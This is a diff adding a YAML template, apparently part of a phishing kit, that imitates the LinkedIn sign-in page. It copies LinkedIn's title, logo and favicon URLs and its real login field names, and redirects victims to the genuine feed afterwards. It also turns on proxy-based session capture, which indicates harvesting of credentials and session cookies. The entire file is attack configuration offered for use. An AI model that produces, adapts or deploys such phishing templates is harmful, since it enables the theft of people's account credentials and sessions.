@@ -1,0 +1,26 @@
+name: "LinkedIn Login"
+author: "Sheikh-CoedexTech"
+version: "1.0"
+
+page_title: "Sign In | LinkedIn"
+company_name: "LinkedIn"
+logo_url: "https://static.licdn.com/aero-v1/sc/h/95oetr8ch1b4lk3f82kbv0q28"
+favicon_url: "https://static.licdn.com/aero-v1/sc/h/al2o9zrvru7aqj8e1x2rzsrca"
+redirect_after: "https://www.linkedin.com/feed/"
+
+fields:
+  - id: session_key
+    name: session_key
+    label: Email or Phone
+    type: email
+    placeholder: "Email or Phone"
+    required: true
+  - id: session_password
+    name: session_password
+    label: Password
+    type: password
+    placeholder: "Password"
+    required: true
+
+session_capture: true
+session_capture_method: proxy
